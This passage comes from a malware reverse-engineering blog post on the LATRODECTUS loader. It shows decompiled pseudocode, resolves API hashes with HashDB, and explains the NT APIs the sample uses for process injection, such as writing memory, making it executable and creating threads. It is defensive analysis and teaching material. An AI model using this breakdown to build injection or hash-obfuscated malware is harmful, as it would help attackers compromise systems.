</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        unk_180010EB8 <span style="color:#ff79c6">=</span> mw_get_module_handle(<span style="color:#bd93f9">0x26797E77</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>unk_180010EB8 )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>using HashDB Hunt Algorithm + HashDB Lookup again reveals the hash inside the <code>crc32</code> algorithm, and that the hash corresponds to <code>ntdll.dll</code>!</p>
<p>so:
<code>0x26797E77</code> can be resolved to <code>ntdll_dll</code>; <code>unk_180010EB8()</code> can be resolved to <code>mw_handle_ntdll_dll()</code>; <code>sub_18000AA30()</code> can be resolved to <code>mw_resolve_ntdll_dll()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">mw_resolve_ntdll_dll</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        mw_handle_ntdll_dll <span style="color:#ff79c6">=</span> mw_get_module_handle(ntdll_dll);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>mw_handle_ntdll_dll )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="nt-apis">NT APIs</h2>
<p><code>sub_18000A3F8()</code> is a large function that contains several hashes, and shows <code>mw_handle_ntdll_dll</code> being used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>[<span style="color:#f1fa8c">&#34;... this pattern continues above&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> v110; <span style="color:#6272a4">// [rsp+390h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>v111; <span style="color:#6272a4">// [rsp+398h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">**</span>v112)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v2[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">529125397</span>;
</span></span><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v4 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>qword_180010A10;
</span></span><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1268447051</span>;
</span></span><span style="display:flex;"><span>v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>qword_1800109C8;
</span></span><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">898953861</span>;
</span></span><span style="display:flex;"><span>v9 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v10 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>unk_1800109D0;
</span></span><span style="display:flex;"><span>v11 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1513862064</span>;
</span></span><span style="display:flex;"><span>v12 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>qword_1800109D8;
</span></span><span style="display:flex;"><span>v14 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">823342452</span>;
</span></span><span style="display:flex;"><span>v15 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v16 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>unk_180010A70;
</span></span><span style="display:flex;"><span>v17 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">96068967</span>;
</span></span><span style="display:flex;"><span>v18 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>[<span style="color:#f1fa8c">&#34;... this pattern continues until v112&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x25uLL</span>; <span style="color:#ff79c6">++</span> i )
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v4)[<span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i ] <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD)sub_180008540(<span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i), v2[<span style="color:#bd93f9">6</span> <span style="color:#ff79c6">*</span> i], <span style="color:#bd93f9">0</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span></code></pre></div><p>depending on your level of experience with a function like this, it can signal different things. one of the main ideas should be that it&rsquo;s probably resolving <code>Nt</code>-level (i.e. Native). the Windows Native API is an abstraction layer that sits between the OS kernel, and the Win32 API. it&rsquo;s exported from <code>ntdll.dll</code> (in the <code>system32</code> folder), with the exports being stubs for the kernel.</p>
<p>simply put, the <code>NT API</code> is a convenient and fast way for user-mode applications to communicate with kernel-mode functions and processes.</p>
<p>let&rsquo;s start to analyze this the same way as i&rsquo;ve done previously: the hash.</p>
<p>hitting <code>H</code> on the first hash will convert it to hex: <code>v2[0] = 0xE0762FEB;</code>. looking up this hash finds a match: <code>NtAllocateVirtualMemory</code>. thus, we can rewrite the value of <code>v2[0]</code>: <code>v2[0] = NtAllocateVirtualMemory_0;</code>.</p>
<p>another clue to help in deciphering this function is at the bottom.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x25uLL</span>; <span style="color:#ff79c6">++</span> i )
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v4)[<span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i ] <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD)sub_180008540(<span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i), v2[<span style="color:#bd93f9">6</span> <span style="color:#ff79c6">*</span> i], <span style="color:#bd93f9">0</span>));
</span></span></code></pre></div><p>both <code>v2[0]</code> and <code>v3</code> are being passed to a function <code>sub_180008540()</code>. this would imply that the <code>_QWORD</code> that appears at every 3rd value (like <code>v4 = &amp;qword_180010A10</code>) is actually the <strong>address</strong> of the API function referenced at the 1st value. using this logic, we can rename <code>v2[0]</code>, <code>v3</code>, and <code>v4</code> as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v2[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> NtAllocateVirtualMemory_0;
</span></span><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v4 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtAllocateVirtualMemory;
</span></span></code></pre></div><p>at this point, a pattern should emerge: this large function&rsquo;s mission is to resolve all the Dynamic APIs needed for the malware to work. the first value is the name of the API, the second value is getting the handle of the API, and the third value is the memory address of the API.</p>
<p>repeating the above steps for the rest of the functions should now be straightforward. remember, every second value is <code>&amp;mw_handle_ntdll_dll</code>, which i&rsquo;m not going to include in the code below (but it&rsquo;s still needed).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> RtlGetVersion_0;
</span></span><span style="display:flex;"><span>v7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlGetVersion;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> NtCreateThread_0;
</span></span><span style="display:flex;"><span>v10 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v11 <span style="color:#ff79c6">=</span> NtQueryInformationProcess_0;
</span></span><span style="display:flex;"><span>v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationProcess;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v14 <span style="color:#ff79c6">=</span> NtQueryInformationThread_0;
</span></span><span style="display:flex;"><span>v16 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v17 <span style="color:#ff79c6">=</span> NtCreateUserProcess_0;
</span></span><span style="display:flex;"><span>v19 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateUserProcess;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v20 <span style="color:#ff79c6">=</span> NtMapViewOfSection_0;
</span></span><span style="display:flex;"><span>v22 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtMapViewOfSection;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v23 <span style="color:#ff79c6">=</span> NtCreateSection_0;
</span></span><span style="display:flex;"><span>v25 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateSection;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v26 <span style="color:#ff79c6">=</span> LdrLoadDll_0;
</span></span><span style="display:flex;"><span>v28 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrLoadDll;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v29 <span style="color:#ff79c6">=</span> LdrGetDllHandle_0;
</span></span><span style="display:flex;"><span>v31 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrGetDllHandle;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v32 <span style="color:#ff79c6">=</span> NtWriteVirtualMemory_0;
</span></span><span style="display:flex;"><span>v34 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v35 <span style="color:#ff79c6">=</span> NtProtectVirtualMemory_0;
</span></span><span style="display:flex;"><span>v37 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtProtectVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v38 <span style="color:#ff79c6">=</span> NtDeviceIoControlFile_0;
</span></span><span style="display:flex;"><span>v40 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeviceIoControlFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v41 <span style="color:#ff79c6">=</span> NtSetContextThread_0;
</span></span><span style="display:flex;"><span>v43 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetContextThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v44 <span style="color:#ff79c6">=</span> NtOpenProcess_0;
</span></span><span style="display:flex;"><span>v46 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenProcess;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v47 <span style="color:#ff79c6">=</span> NtClose_0;
</span></span><span style="display:flex;"><span>v49 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtClose;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v50 <span style="color:#ff79c6">=</span> NtCreateFile_0;
</span></span><span style="display:flex;"><span>v52 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v53 <span style="color:#ff79c6">=</span> NtOpenFile_0;
</span></span><span style="display:flex;"><span>v55 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v56 <span style="color:#ff79c6">=</span> NtDeleteFile_0;
</span></span><span style="display:flex;"><span>v58 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeleteFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v59 <span style="color:#ff79c6">=</span> NtReadVirtualMemory_0;
</span></span><span style="display:flex;"><span>v61 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v62 <span style="color:#ff79c6">=</span> NtQueryVirtualMemory_0;
</span></span><span style="display:flex;"><span>v64 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v65 <span style="color:#ff79c6">=</span> NtOpenThread_0;
</span></span><span style="display:flex;"><span>v67 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v68 <span style="color:#ff79c6">=</span> NtResumeThread_0;
</span></span><span style="display:flex;"><span>v70 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtResumeThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v71 <span style="color:#ff79c6">=</span> NtFreeVirtualMemory_0;
</span></span><span style="display:flex;"><span>v73 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFreeVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v74 <span style="color:#ff79c6">=</span> NtFlushInstructionCache_0;
</span></span><span style="display:flex;"><span>v76 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFlushInstructionCache;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v77 <span style="color:#ff79c6">=</span> RtlRandomEx_0;
</span></span><span style="display:flex;"><span>v79 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlRandomEx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v80 <span style="color:#ff79c6">=</span> NtQuerySystemInformation_0;
</span></span><span style="display:flex;"><span>v82 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQuerySystemInformation;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v83 <span style="color:#ff79c6">=</span> LdrQueryProcessModuleInformation_0;
</span></span><span style="display:flex;"><span>v85 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrQueryProcessModuleInformation;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v86 <span style="color:#ff79c6">=</span> RtlInitUnicodeString_0;
</span></span><span style="display:flex;"><span>v88 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlInitUnicodeString;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v89 <span style="color:#ff79c6">=</span> NtWriteFile_0;
</span></span><span style="display:flex;"><span>v91 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v92 <span style="color:#ff79c6">=</span> NtReadFile_0;
</span></span><span style="display:flex;"><span>v94 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v95 <span style="color:#ff79c6">=</span> NtDelayExecution_0;
</span></span><span style="display:flex;"><span>v97 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDelayExecution;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v98 <span style="color:#ff79c6">=</span> NtOpenKey_0;
</span></span><span style="display:flex;"><span>v100 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v101 <span style="color:#ff79c6">=</span> NtSetValueKey_0;
</span></span><span style="display:flex;"><span>v103 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetValueKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v104 <span style="color:#ff79c6">=</span> NtQueryValueKey_0;
</span></span><span style="display:flex;"><span>v106 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryValueKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v107 <span style="color:#ff79c6">=</span> RtlFormatCurrentUserKeyPath_0;
</span></span><span style="display:flex;"><span>v109 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlFormatCurrentUserKeyPath;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v110 <span style="color:#ff79c6">=</span> NtQueryInformationFile_0;
</span></span><span style="display:flex;"><span>v112 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationFile;
</span></span></code></pre></div><h2 id="what-do-these-apis-do">what do these APIs do?</h2>
<p>the large function <code>sub_18000A3F8()</code> can now be resolved to <code>mw_resolve_ntapi()</code>, as it&rsquo;s clearly attempting to interact with low-level system operations: functionalities like memory management, thread/process manipulation, file + I/O operations, registry access, information gathering, etc.</p>
<p>here&rsquo;s a breakdown of what each of these APIs do.</p>
<h1 id="ntallocatevirtualmemory_0"><code>NtAllocateVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v2[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> NtAllocateVirtualMemory_0;
</span></span></code></pre></div><p>this allocates memory in the virtual address space of a process. it&rsquo;s essential for managing memory dynamically within a process, as it allows the allocation of memory regions.</p>
<p><code>LATRODECTUS</code> probably uses this API to allocate memory where it can load/inject its payload. as i&rsquo;ve talked about in an earlier post, this is a critical step in process injection techniques: malware needs to create space in a target process&rsquo;s memory to insert + execute its code.</p>
<p><code>v2[0]</code> means that the first element of the <code>v2</code> array is assigned the hash (or identifier) of the <code>NtAllocateVirtualMemory</code> function.</p>
<h1 id="rtlgetversion_0"><code>RtlGetVersion_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> RtlGetVersion_0;
</span></span><span style="display:flex;"><span>v7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlGetVersion;
</span></span></code></pre></div><p>gets version information about current OS. can be used to check OS version + tailor behaviour based on versions.</p>
<h1 id="ntcreatethread_0"><code>NtCreateThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> NtCreateThread_0;
</span></span><span style="display:flex;"><span>v10 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateThread;
</span></span></code></pre></div><p>creates a new thread within the current process (or a remote process). can be used to spawn threads for running payloads, or inject code into other processes.</p>
<h1 id="ntqueryinformationprocess_0"><code>NtQueryInformationProcess_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v11 <span style="color:#ff79c6">=</span> NtQueryInformationProcess_0;
</span></span><span style="display:flex;"><span>v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationProcess;
</span></span></code></pre></div><p>gets information about a process: memory usage, exit status, privileges. can be used to collect details about a process.</p>
<h1 id="ntqueryinformationthread_0"><code>NtQueryInformationThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v14 <span style="color:#ff79c6">=</span> NtQueryInformationThread_0;
</span></span><span style="display:flex;"><span>v16 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationThread;
</span></span></code></pre></div><p>gets information about a thread: priority, base priority, processor affinity. can be used to inspect its own threads or those of another process.</p>
<h1 id="ntcreateuserprocess_0"><code>NtCreateUserProcess_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v17 <span style="color:#ff79c6">=</span> NtCreateUserProcess_0;
</span></span><span style="display:flex;"><span>v19 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateUserProcess;
</span></span></code></pre></div><p>creates a new process with specific attributes. can be used to spawn a new process.</p>
<h1 id="ntmapviewofsection_0"><code>NtMapViewOfSection_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v20 <span style="color:#ff79c6">=</span> NtMapViewOfSection_0;
</span></span><span style="display:flex;"><span>v22 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtMapViewOfSection;
</span></span></code></pre></div><p>maps a view of a section [range of memory] into the address space of a calling process, or another process. this is used in process injection techniques.</p>
<h1 id="ntcreatesection_0"><code>NtCreateSection_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v23 <span style="color:#ff79c6">=</span> NtCreateSection_0;
</span></span><span style="display:flex;"><span>v25 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateSection;
</span></span></code></pre></div><p>creates a section object, which is used to share memory between processes or to map files into memory. can be used with <code>NtMapViewOfSection</code> for advanced process injection or file mapping.</p>
<h1 id="ldrloaddll_0"><code>LdrLoadDll_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v26 <span style="color:#ff79c6">=</span> LdrLoadDll_0;
</span></span><span style="display:flex;"><span>v28 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrLoadDll;
</span></span></code></pre></div><p>loads a DLL into the address space of the current process. the malware might be dynamically loading additional libraries that it needs to adapt or extend its functionality.</p>
<h1 id="ldrgetdllhandle_0"><code>LdrGetDllHandle_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v29 <span style="color:#ff79c6">=</span> LdrGetDllHandle_0;
</span></span><span style="display:flex;"><span>v31 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrGetDllHandle;
</span></span></code></pre></div><p>gets a handle to a loaded DLL. can be used to check if a DLL is already loaded, or to get a reference to use its functions.</p>
<h1 id="ntwritevirtualmemory_0"><code>NtWriteVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v32 <span style="color:#ff79c6">=</span> NtWriteVirtualMemory_0;
</span></span><span style="display:flex;"><span>v34 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteVirtualMemory;
</span></span></code></pre></div><p>writes data to the virtual memory of a process. usually used to inject payload into another process&rsquo;s memory.</p>
<h1 id="ntprotectvirtualmemory_0"><code>NtProtectVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v35 <span style="color:#ff79c6">=</span> NtProtectVirtualMemory_0;
</span></span><span style="display:flex;"><span>v37 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtProtectVirtualMemory;
</span></span></code></pre></div><p>changes the protection on a region of virtual memory. malware sets the memory permissions to <code>X</code> (executable), allowing the injected code to run.</p>
<h1 id="ntdeviceiocontrolfile_0"><code>NtDeviceIoControlFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v38 <span style="color:#ff79c6">=</span> NtDeviceIoControlFile_0;
